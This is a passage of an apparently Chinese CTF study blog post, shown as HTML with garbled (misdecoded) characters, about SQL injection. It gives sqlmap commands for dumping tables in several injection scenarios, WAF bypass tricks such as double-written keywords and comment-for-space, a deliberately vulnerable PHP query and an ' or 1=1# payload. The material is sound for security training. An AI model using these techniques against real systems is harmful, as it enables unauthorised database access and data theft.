id="äºŒã€SQLmap-è‡ªåŠ¨æ³¨å…¥å¿«é€Ÿä¸Šæ‰‹"><a href="#äºŒã€SQLmap-è‡ªåŠ¨æ³¨å…¥å¿«é€Ÿä¸Šæ‰‹" class="headerlink" title="äºŒã€SQLmap è‡ªåŠ¨æ³¨å…¥å¿«é€Ÿä¸Šæ‰‹"></a>äºŒã€SQLmap è‡ªåŠ¨æ³¨å…¥å¿«é€Ÿä¸Šæ‰‹</h2><h4 id="å…³é”®å‚æ•°è¯´æ˜"><a href="#å…³é”®å‚æ•°è¯´æ˜" class="headerlink" title="å…³é”®å‚æ•°è¯´æ˜"></a>å…³é”®å‚æ•°è¯´æ˜</h4><table><thead><tr><th>å‚æ•°</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td><code>-u</code></td><td>æŒ‡å®šç›®æ ‡ URL</td></tr><tr><td><code>-r</code></td><td>åŠ è½½ HTTP è¯·æ±‚æ–‡ä»¶ï¼ˆBurp æŠ“åŒ…ä¿å­˜ä¸º <code>.txt</code>ï¼‰</td></tr><tr><td><code>-p</code></td><td>æŒ‡å®šæµ‹è¯•çš„å‚æ•°ï¼ˆå¦‚ <code>id</code>ã€<code>username</code>ï¼‰</td></tr><tr><td><code>--dbs</code></td><td>åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“</td></tr><tr><td><code>-D &lt;db&gt;</code></td><td>æŒ‡å®šæ•°æ®åº“</td></tr><tr><td><code>--tables</code></td><td>åˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„æ‰€æœ‰è¡¨</td></tr><tr><td><code>-T &lt;table&gt;</code></td><td>æŒ‡å®šè¡¨</td></tr><tr><td><code>--columns</code></td><td>åˆ—å‡ºæŒ‡å®šè¡¨çš„æ‰€æœ‰å­—æ®µ</td></tr><tr><td><code>-C &lt;columns&gt;</code></td><td>æŒ‡å®šå­—æ®µï¼ˆå¤šä¸ªç”¨é€—å·åˆ†éš”ï¼‰</td></tr><tr><td><code>--dump</code></td><td>å¯¼å‡ºæŒ‡å®šå­—æ®µçš„æ•°æ®</td></tr><tr><td><code>--current-db</code></td><td>è·å–å½“å‰æ•°æ®åº“å</td></tr><tr><td><code>--current-user</code></td><td>è·å–å½“å‰æ•°æ®åº“ç”¨æˆ·</td></tr><tr><td><code>--technique</code></td><td>æŒ‡å®šæ³¨å…¥æŠ€æœ¯ï¼ˆå¦‚ <code>B</code> å¸ƒå°”ç›²æ³¨ï¼Œ<code>T</code> æ—¶é—´ç›²æ³¨ï¼Œ<code>U</code> è”åˆæŸ¥è¯¢ï¼‰</td></tr><tr><td><code>--time-sec</code></td><td>æ—¶é—´ç›²æ³¨æ—¶çš„å»¶è¿Ÿæ—¶é—´ï¼ˆé»˜è®¤ 5 ç§’ï¼‰</td></tr><tr><td><code>--tamper</code></td><td>ä½¿ç”¨è„šæœ¬ç»•è¿‡ WAFï¼ˆå¦‚ <code>space2comment</code> æ›¿æ¢ç©ºæ ¼ä¸ºæ³¨é‡Šï¼‰</td></tr><tr><td><code>--threads</code></td><td>å¤šçº¿ç¨‹ï¼ˆé»˜è®¤ 1ï¼ŒCTF ä¸­å»ºè®® 1-5 é¿å…è§¦å‘é˜²æŠ¤ï¼‰</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 --current-db<br><br>python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables<br><br>python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --columns<br><br>python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag -C flag --dump<br></code></pre></td></tr></table></figure><p>ä¾æ¬¡ä¸ºæŸ¥è¯¢æœ€è¿‘ä½¿ç”¨çš„æ•°æ®åº“ï¼ŒæŸ¥è¯¢è¡¨ï¼ŒæŸ¥è¯¢å­—æ®µï¼Œè½¬å­˜æ•°æ®</p><h3 id="å¸¸è§åœºæ™¯"><a href="#å¸¸è§åœºæ™¯" class="headerlink" title="å¸¸è§åœºæ™¯"></a>å¸¸è§åœºæ™¯</h3><h4 id="åœºæ™¯-1ï¼šGET-å‚æ•°æ³¨å…¥"><a href="#åœºæ™¯-1ï¼šGET-å‚æ•°æ³¨å…¥" class="headerlink" title="åœºæ™¯ 1ï¼šGET å‚æ•°æ³¨å…¥"></a>åœºæ™¯ 1ï¼šGET å‚æ•°æ³¨å…¥</h4><p><strong>ç¤ºä¾‹ URL</strong>ï¼š<code>http://ctf.example.com/web1/?id=1</code>  </p><p><strong>æ“ä½œæµç¨‹</strong>ï¼š</p><ol><li><p><strong>æ£€æµ‹æ³¨å…¥ç‚¹</strong>ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -u <span class="hljs-string">&quot;http://ctf.example.com/web1/?id=1&quot;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>è·å–æ•°æ®åº“</strong>ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -u <span class="hljs-string">&quot;http://ctf.example.com/web1/?id=1&quot;</span> --dbs<br></code></pre></td></tr></table></figure></li><li><p><strong>è·å–è¡¨å’Œå­—æ®µ</strong>ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -u <span class="hljs-string">&quot;http://ctf.example.com/web1/?id=1&quot;</span> -D ctf_db --tables<br>python sqlmap.py -u <span class="hljs-string">&quot;http://ctf.example.com/web1/?id=1&quot;</span> -D ctf_db -T flag --columns<br></code></pre></td></tr></table></figure></li><li><p><strong>å¯¼å‡ºæ•°æ®</strong>ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -u <span class="hljs-string">&quot;http://ctf.example.com/web1/?id=1&quot;</span> -D ctf_db -T flag -C flag --dump<br></code></pre></td></tr></table></figure></li></ol><h4 id="åœºæ™¯-2ï¼šPOST-è¡¨å•æ³¨å…¥"><a href="#åœºæ™¯-2ï¼šPOST-è¡¨å•æ³¨å…¥" class="headerlink" title="åœºæ™¯ 2ï¼šPOST è¡¨å•æ³¨å…¥"></a>åœºæ™¯ 2ï¼šPOST è¡¨å•æ³¨å…¥</h4><p><strong>ç¤ºä¾‹</strong>ï¼šç™»å½•è¡¨å•ï¼ˆ<code>username</code> å’Œ <code>password</code> å‚æ•°ï¼‰  </p><p><strong>æ“ä½œæµç¨‹</strong>ï¼š</p><ol><li><p><strong>Burp æŠ“åŒ…å¹¶ä¿å­˜ä¸º</strong> <strong><code>request.txt</code></strong>ï¼š</p> <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ctf.example.com<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>31<br><br><span class="language-ini"><span class="hljs-attr">username</span>=admin&amp;password=<span class="hljs-number">123456</span></span><br></code></pre></td></tr></table></figure></li><li><p><strong>SQLmap æ£€æµ‹</strong>ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -r request.txt -p username  <span class="hljs-comment"># æŒ‡å®šæµ‹è¯• username å‚æ•°</span><br></code></pre></td></tr></table></figure></li><li><p><strong>åç»­æ“ä½œåŒ GET æ³¨å…¥</strong>ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -r request.txt -p username --dbs<br><span class="hljs-comment"># ... å¯¼å‡º flag</span><br></code></pre></td></tr></table></figure></li></ol><h4 id="åœºæ™¯-3ï¼šå¸ƒå°”ç›²æ³¨ï¼ˆæ— å›æ˜¾ï¼‰"><a href="#åœºæ™¯-3ï¼šå¸ƒå°”ç›²æ³¨ï¼ˆæ— å›æ˜¾ï¼‰" class="headerlink" title="åœºæ™¯ 3ï¼šå¸ƒå°”ç›²æ³¨ï¼ˆæ— å›æ˜¾ï¼‰"></a>åœºæ™¯ 3ï¼šå¸ƒå°”ç›²æ³¨ï¼ˆæ— å›æ˜¾ï¼‰</h4><p><strong>ç‰¹å¾</strong>ï¼šé¡µé¢æ— æŠ¥é”™ï¼Œä»…æ ¹æ®è¾“å…¥è¿”å›â€œæ­£å¸¸â€æˆ–â€œå¼‚å¸¸â€ï¼ˆå¦‚ç™»å½•æˆåŠŸ&#x2F;å¤±è´¥ï¼‰  </p><p><strong>æ“ä½œæµç¨‹</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment"># æŒ‡å®šå¸ƒå°”ç›²æ³¨æŠ€æœ¯</span><br>python sqlmap.py -r request.txt -p username --technique B --dbs<br><span class="hljs-comment"># å¯¼å‡ºæ•°æ®ï¼ˆè¾ƒæ…¢ï¼Œè€å¿ƒç­‰å¾…ï¼‰</span><br>python sqlmap.py -r request.txt -p username -D ctf_db -T flag -C flag --dump<br></code></pre></td></tr></table></figure><h4 id="åœºæ™¯-4ï¼šæ—¶é—´ç›²æ³¨ï¼ˆæ— å›æ˜¾ï¼‰"><a href="#åœºæ™¯-4ï¼šæ—¶é—´ç›²æ³¨ï¼ˆæ— å›æ˜¾ï¼‰" class="headerlink" title="åœºæ™¯ 4ï¼šæ—¶é—´ç›²æ³¨ï¼ˆæ— å›æ˜¾ï¼‰"></a>åœºæ™¯ 4ï¼šæ—¶é—´ç›²æ³¨ï¼ˆæ— å›æ˜¾ï¼‰</h4><p><strong>ç‰¹å¾</strong>ï¼šé¡µé¢æ— ä»»ä½•å·®å¼‚ï¼Œéœ€é€šè¿‡å“åº”æ—¶é—´åˆ¤æ–­  </p><p><strong>æ“ä½œæµç¨‹</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment"># æŒ‡å®šæ—¶é—´ç›²æ³¨æŠ€æœ¯ï¼Œè®¾ç½®å»¶è¿Ÿ 3 ç§’</span><br>python sqlmap.py -r request.txt -p username --technique T --time-sec 3 --dbs<br><span class="hljs-comment"># å¯¼å‡ºæ•°æ®ï¼ˆéå¸¸æ…¢ï¼Œå¯é€‚å½“è°ƒå¤§ threadsï¼‰</span><br>python sqlmap.py -r request.txt -p username -D ctf_db -T flag -C flag --dump --threads 3<br></code></pre></td></tr></table></figure><h4 id="åœºæ™¯-5ï¼šå®½å­—èŠ‚æ³¨å…¥ï¼ˆGBK-ç¼–ç ï¼‰"><a href="#åœºæ™¯-5ï¼šå®½å­—èŠ‚æ³¨å…¥ï¼ˆGBK-ç¼–ç ï¼‰" class="headerlink" title="åœºæ™¯ 5ï¼šå®½å­—èŠ‚æ³¨å…¥ï¼ˆGBK ç¼–ç ï¼‰"></a>åœºæ™¯ 5ï¼šå®½å­—èŠ‚æ³¨å…¥ï¼ˆGBK ç¼–ç ï¼‰</h4><p><strong>ç‰¹å¾</strong>ï¼šåç«¯ä½¿ç”¨ <code>addslashes()</code> æˆ– <code>mysql_real_escape_string()</code> è¿‡æ»¤ï¼Œä½†æ•°æ®åº“ä¸º GBK ç¼–ç   </p><p><strong>æ“ä½œæµç¨‹</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment"># ä½¿ç”¨ tamper è„šæœ¬ç»•è¿‡</span><br>python sqlmap.py -u <span class="hljs-string">&quot;http://ctf.example.com/web5/?id=1&quot;</span> --tamper=gbkencode --dbs<br></code></pre></td></tr></table></figure><h4 id="åœºæ™¯-6ï¼šäºŒæ¬¡æ³¨å…¥"><a href="#åœºæ™¯-6ï¼šäºŒæ¬¡æ³¨å…¥" class="headerlink" title="åœºæ™¯ 6ï¼šäºŒæ¬¡æ³¨å…¥"></a>åœºæ™¯ 6ï¼šäºŒæ¬¡æ³¨å…¥</h4><p><strong>ç‰¹å¾</strong>ï¼šæ³¨å…¥ç‚¹ä¸åœ¨åˆå§‹è¾“å…¥ï¼Œè€Œåœ¨åç»­è¯»å–å­˜å‚¨æ•°æ®æ—¶è§¦å‘ï¼ˆå¦‚æ³¨å†Œç”¨æˆ·ååç™»å½•ï¼‰  </p><p><strong>æ“ä½œæµç¨‹</strong>ï¼š</p><ol><li><p><strong>æ³¨å†Œæ¶æ„ç”¨æˆ·å</strong>ï¼š<code>admin&#39; --</code>  </p></li><li><p>**Burp æŠ“åŒ…ç™»å½•è¯·æ±‚å¹¶ä¿å­˜ä¸º ** <strong><code>login.txt</code></strong>  </p></li><li><p><strong>SQLmap æ£€æµ‹ç™»å½•è¯·æ±‚ä¸­çš„ ** <strong><code>username</code></strong> ** å‚æ•°</strong>ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -r login.txt -p username --dbs<br></code></pre></td></tr></table></figure></li></ol><h3 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h3><p><a href="https://blog.csdn.net/qq_44005305/article/details/146025669">sqlmapå¸¸ç”¨å‘½ä»¤æ•´ç†</a></p><h2 id="ä¸‰ã€SQLè¯­æ³•"><a href="#ä¸‰ã€SQLè¯­æ³•" class="headerlink" title="ä¸‰ã€SQLè¯­æ³•"></a>ä¸‰ã€SQLè¯­æ³•</h2><p><code>show tables</code>æŸ¥è¯¢æ‰€æœ‰è¡¨ï¼Œå¯ä»¥çœ‹åˆ°flagè¡¨</p><p><code>show columns from flag</code>æŸ¥è¯¢flagè¡¨çš„æ‰€æœ‰å­—æ®µ</p><table><thead><tr><th align="left">åˆ—å</th><th></th></tr></thead><tbody><tr><td align="left">Field</td><td>åˆ—çš„åç§°ã€‚è¿™æ˜¯è¡¨ä¸­å®šä¹‰çš„åˆ—æ ‡è¯†ç¬¦ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè¡¨ä¸­æœ‰ä¸€ä¸ªå­˜å‚¨ç”¨æˆ·åçš„åˆ—ï¼Œè¿™é‡Œä¼šæ˜¾ç¤ºç›¸åº”çš„åˆ—åï¼Œå¦‚ <code>username</code></td></tr><tr><td align="left">Type</td><td>åˆ—çš„æ•°æ®ç±»å‹ã€‚è¡¨æ˜è¯¥åˆ—å¯ä»¥å­˜å‚¨çš„æ•°æ®ç±»å‹ï¼Œå¦‚ <code>INT</code>ï¼ˆæ•´æ•°ç±»å‹ï¼‰ã€<code>VARCHAR(255)</code>ï¼ˆå¯å˜é•¿åº¦å­—ç¬¦ä¸²ï¼Œæœ€å¤§é•¿åº¦ä¸º 255ï¼‰ã€<code>DATE</code>ï¼ˆæ—¥æœŸç±»å‹ï¼‰ç­‰</td></tr><tr><td align="left">Null</td><td>è¡¨ç¤ºè¯¥åˆ—æ˜¯å¦å…è®¸å­˜å‚¨ <code>NULL</code> å€¼ã€‚å¦‚æœæ˜¾ç¤º <code>YES</code>ï¼Œåˆ™è¯¥åˆ—å¯ä»¥æ¥å— <code>NULL</code>ï¼›å¦‚æœæ˜¾ç¤º <code>NO</code>ï¼Œåˆ™ä¸å…</td></tr><tr><td align="left">Key</td><td>æ˜¾ç¤ºè¯¥åˆ—æ˜¯å¦è¢«å®šä¹‰ä¸ºé”®ï¼ˆå¦‚ä¸»é”® <code>PRI</code>ã€å”¯ä¸€é”® <code>UNI</code> ç­‰ï¼‰ã€‚å¦‚æœæ˜¯ä¸»é”®åˆ—ï¼Œè¿™é‡Œä¼šæ˜¾ç¤º <code>PRI</code></td></tr><tr><td align="left">Default</td><td>åˆ—çš„é»˜è®¤å€¼ã€‚å¦‚æœåœ¨åˆ›å»ºè¡¨æ—¶ä¸ºè¯¥åˆ—è®¾ç½®äº†é»˜è®¤å€¼ï¼Œè¿™é‡Œä¼šæ˜¾ç¤ºå‡ºæ¥ã€‚ä¾‹å¦‚ï¼Œè‹¥æŸåˆ—é»˜è®¤å€¼ä¸º <code>0</code>ï¼Œåˆ™ä¼šåœ¨æ­¤å¤„æ˜¾ç¤º <code>0</code>ã€‚å¦‚æœæ²¡æœ‰è®¾ç½®é»˜è®¤å€¼ï¼Œå¯èƒ½æ˜¾ç¤ºä¸º <code>NULL</code> æˆ–ç©ºç™½</td></tr><tr><td align="left">Extra</td><td>æä¾›å…³äºè¯¥åˆ—çš„é¢å¤–ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œå¯¹äºè‡ªå¢é•¿åˆ—ï¼Œè¿™é‡Œå¯èƒ½æ˜¾ç¤º <code>auto_increment</code></td></tr></tbody></table><p>unionå¯ä»¥å°†ä¸¤ä¸ªselectè¯­å¥çš„ç»“æœåˆå¹¶åˆ°ä¸€ä¸ªç»“æœé›†ä¸­ï¼Œä½†è¦æ±‚ä¸¤ä¸ªselectè¯­å¥æœ‰ç›¸åŒçš„åˆ—æ•°</p><p>æ‹¼æ¥åçš„è¯­å¥ï¼š<code>select username from users where id=0 union select password from users</code></p><p><code>order by</code> å…³é”®å­—ç”¨äºå¯¹ç»“æœé›†æŒ‰ç…§ä¸€ä¸ªåˆ—æˆ–è€…å¤šä¸ªåˆ—è¿›è¡Œæ’åºï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨äºŒåˆ†æ³•è”åˆæŸ¥è¯¢å­—æ®µæ•°</p><p>SELECT è¯­å¥ç”¨äºä»æ•°æ®åº“ä¸­é€‰å–æ•°æ®</p><p><code>SELECT column1, column2, ... FROM table_name;</code> </p><p>WHERE å­å¥ç”¨äºæå–é‚£äº›æ»¡è¶³æŒ‡å®šæ¡ä»¶çš„è®°å½•</p><p><code>SELECT column1, column2, ... FROM table_name WHERE condition;</code> </p><p>LIMIT å­å¥ç”¨äºæ§åˆ¶æŸ¥è¯¢çš„åˆ—</p><p><code>SELECT column1, column2, ... FROM table_name LIMIT 3;</code>  è¿”å›å‰ 3 è¡Œæ•°æ®</p><p><code>select database()</code>å¯ä»¥ç”¨æ¥è·å–å½“å‰æ•°æ®åº“çš„åå­—</p><p>ä½¿ç”¨<code>union select</code>è¯­å¥ï¼Œç»“åˆ<code>information_schema</code>ç³»ç»Ÿè¡¨ï¼Œè·å–è¡¨åå’Œåˆ—å</p><p><code>select  group_concat(table_name) from information_schema.tables where table_schema=database()</code></p><p>æŸ¥è¯¢å­—æ®µ <code>select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;</code></p><p>æŸ¥è¯¢å€¼ <code>select 1,group_concat(flag) from sqli.flag</code></p><h4 id="è¿‡æ»¤ç©ºæ ¼"><a href="#è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼"></a>è¿‡æ»¤ç©ºæ ¼</h4><p>ç”¨<code>/**/</code> ä»£æ›¿</p><h4 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a>åŒå†™ç»•è¿‡</h4><p>SQL æ³¨å…¥ä¸­åŒå†™ç»•è¿‡çš„ç›®æ ‡æ˜¯å¯¹æŠ—<strong>WAF &#x2F; è¿‡æ»¤è§„åˆ™å¯¹å…³é”®è¯ï¼ˆå¦‚<code>select</code>ï¼‰çš„åˆ é™¤ &#x2F; æ›¿æ¢</strong>ï¼šè¿‡æ»¤è§„åˆ™é€šå¸¸ä¼šåŒ¹é…å¹¶åˆ é™¤å­—ç¬¦ä¸²ä¸­çš„<code>select</code>ï¼Œå› æ­¤æ„é€ é€»è¾‘æ˜¯ï¼š</p><p>æŠŠ<code>select</code>æ‹†åˆ†ä¸ºã€Œå‰ç¼€ + åç¼€ã€ï¼ˆä¸”<code>å‰ç¼€+åç¼€=select</code>ï¼‰ï¼Œå†åœ¨ä¸­é—´æ’å…¥å®Œæ•´çš„<code>select</code>ï¼Œå½¢æˆã€Œå‰ç¼€ + select + åç¼€ã€ã€‚å½“ WAF åˆ é™¤ä¸­é—´çš„<code>select</code>åï¼Œå‰©ä½™çš„ã€Œå‰ç¼€ + åç¼€ã€ä¼šé‡æ–°æ‹¼æ¥æˆå®Œæ•´çš„<code>select</code></p><blockquote><p>åŒå†™ç»•è¿‡çš„ç»å…¸é€»è¾‘æ˜¯ã€Œç­‰é•¿æ‹†åˆ†å…³é”®è¯ã€ï¼ˆå¦‚<code>union</code>æ‹†<code>uni+union+on</code>ã€<code>insert</code>æ‹†<code>ins+insert+ert</code>ï¼‰ï¼Œ<code>select</code>æ‹† 3+3 æ˜¯è¡Œä¸šé€šç”¨å†™æ³•ï¼Œè€Œ<code>se+select+lect</code>æ˜¯é”™è¯¯çš„æ‹†åˆ†æ€è·¯ï¼Œæ—¢ä¸é€šç”¨ï¼Œä¹Ÿæ˜“å› è¿‡æ»¤è§„åˆ™çš„å¾®å°å·®å¼‚å¤±æ•ˆã€‚</p></blockquote><h2 id="å››ã€ç®€å•çš„SQLæ³¨å…¥"><a href="#å››ã€ç®€å•çš„SQLæ³¨å…¥" class="headerlink" title="å››ã€ç®€å•çš„SQLæ³¨å…¥"></a>å››ã€ç®€å•çš„SQLæ³¨å…¥</h2><h3 id="æ•°å­—å‹æ³¨å…¥"><a href="#æ•°å­—å‹æ³¨å…¥" class="headerlink" title="æ•°å­—å‹æ³¨å…¥"></a>æ•°å­—å‹æ³¨å…¥</h3><h4 id="1-æ ¸å¿ƒç‰¹å¾"><a href="#1-æ ¸å¿ƒç‰¹å¾" class="headerlink" title="1. æ ¸å¿ƒç‰¹å¾"></a>1. æ ¸å¿ƒç‰¹å¾</h4><ul><li><p>æ³¨å…¥å‚æ•°ç›´æ¥æ‹¼æ¥åœ¨SQLè¯­å¥ä¸­ï¼Œ<strong>æœªè¢«å¼•å·åŒ…è£¹</strong>ã€‚</p></li><li><p>ç¤ºä¾‹æµ‹è¯•ï¼šè¾“å…¥ <code>id=2-1</code> ä»èƒ½æŸ¥å‡ºæ•°æ®ï¼ˆæœ¬è´¨æ‰§è¡Œ <code>id=1</code> çš„æŸ¥è¯¢é€»è¾‘ï¼‰ã€‚</p></li></ul><h4 id="2-å…³é”®è¯­æ³•ä¸ç”¨æ³•"><a href="#2-å…³é”®è¯­æ³•ä¸ç”¨æ³•" class="headerlink" title="2. å…³é”®è¯­æ³•ä¸ç”¨æ³•"></a>2. å…³é”®è¯­æ³•ä¸ç”¨æ³•</h4><ul><li><p><strong>union è”åˆæŸ¥è¯¢</strong>ï¼šå¯å°†ä¸¤ä¸ª <code>select</code> è¯­å¥çš„ç»“æœåˆå¹¶ï¼Œè¦æ±‚ä¸¤è¯­å¥<strong>åˆ—æ•°ç›¸åŒ</strong>ã€‚</p></li><li><p>æ‹¼æ¥åç¤ºä¾‹è¯­å¥ï¼š</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure></li><li><p><strong>limit å…³é”®å­—</strong>ï¼šç”¨äºæ§åˆ¶æŸ¥è¯¢ç»“æœçš„è¿”å›æ¡æ•°ï¼ˆé™åˆ¶åˆ—æ•°&#x2F;è¡Œæ•°ï¼‰ã€‚</p></li></ul><h3 id="å­—ç¬¦å‹æ³¨å…¥"><a href="#å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="å­—ç¬¦å‹æ³¨å…¥"></a>å­—ç¬¦å‹æ³¨å…¥</h3><h4 id="1-æ ¸å¿ƒç‰¹å¾-1"><a href="#1-æ ¸å¿ƒç‰¹å¾-1" class="headerlink" title="1. æ ¸å¿ƒç‰¹å¾"></a>1. æ ¸å¿ƒç‰¹å¾</h4><ul><li><p>æ³¨å…¥å‚æ•°è¢«å¼•å·ï¼ˆå•å¼•å·&#x2F;åŒå¼•å·ï¼‰åŒ…è£¹ï¼Œéœ€å…ˆ<strong>é€ƒé€¸å¼•å·</strong>æ‰èƒ½æ³¨å…¥ã€‚</p></li><li><p>ç¤ºä¾‹PHPä»£ç ï¼ˆå­˜åœ¨æ³¨å…¥æ¼æ´ï¼‰ï¼š</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$conn</span>=<span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;select id from users where username=&#x27;&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&#x27;&quot;</span>);<br><span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br></code></pre></td></tr></table></figure></li></ul><h4 id="2-æ³¨å…¥æ€è·¯ä¸æ­¥éª¤"><a href="#2-æ³¨å…¥æ€è·¯ä¸æ­¥éª¤" class="headerlink" title="2. æ³¨å…¥æ€è·¯ä¸æ­¥éª¤"></a>2. æ³¨å…¥æ€è·¯ä¸æ­¥éª¤</h4><ol><li><p><strong>é—­åˆå¼•å·</strong>ï¼šè¾“å…¥å•å¼•å· <code>&#39;</code> æ‰“ç ´åŸSQLè¯­å¥çš„å¼•å·å¹³è¡¡ã€‚</p></li><li><p><strong>æ„é€ æ¡ä»¶</strong>ï¼šä½¿ç”¨ <code>or</code> æ‹¼æ¥æ’çœŸæ¡ä»¶ï¼ˆå¦‚ <code>1=1</code>ï¼‰ï¼Œä½¿æŸ¥è¯¢è¿”å›æ‰€æœ‰ç»“æœã€‚</p></li><li><p><strong>æ³¨é‡Šåç»­</strong>ï¼šç”¨ <code>#</code> æ³¨é‡Šæ‰åŸè¯­å¥ä¸­å¤šä½™çš„å¼•å·å’Œä»£ç ï¼ˆé¿å…è¯­æ³•é”™è¯¯ï¼‰ã€‚</p></li></ol><h4 id="3-ç¤ºä¾‹æ“ä½œ"><a href="#3-ç¤ºä¾‹æ“ä½œ" class="headerlink" title="3. ç¤ºä¾‹æ“ä½œ"></a>3. ç¤ºä¾‹æ“ä½œ</h4><ul><li><p>æ³¨å…¥è¾“å…¥ï¼ˆéœ€URLç¼–ç ï¼‰ï¼š<code>username=&#39;or1=1#</code></p><ul><li>URLç¼–ç åï¼š<code>username=%27or%201=1%23</code></li></ul></li><li><p>å®é™…æ‰§è¡Œçš„SQLè¯­å¥ï¼š</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> #<br></code></pre></td></tr></table></figure></li><li><p>é€»è¾‘è¯´æ˜ï¼š<code>or</code> è¿æ¥ä¸¤ä¸ªè¡¨è¾¾å¼ï¼Œç¬¬ä¸€ä¸ªè¡¨è¾¾å¼ï¼ˆ<code>&#39;&#39;</code> åŒ¹é…ï¼‰ä¸ºå‡ï¼Œç¬¬äºŒä¸ªï¼ˆ<code>1=1</code>ï¼‰ä¸ºçœŸï¼Œæœ€ç»ˆè¿”å›æ‰€æœ‰ç”¨æˆ·çš„idï¼ˆç¤ºä¾‹ä¸­ä»…1æ¡æ•°æ®ï¼Œè¿”å›id&#x3D;1ï¼‰ã€‚</p></li></ul><h3 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h3><h4 id="1-æ ¸å¿ƒç‰¹å¾-2"><a 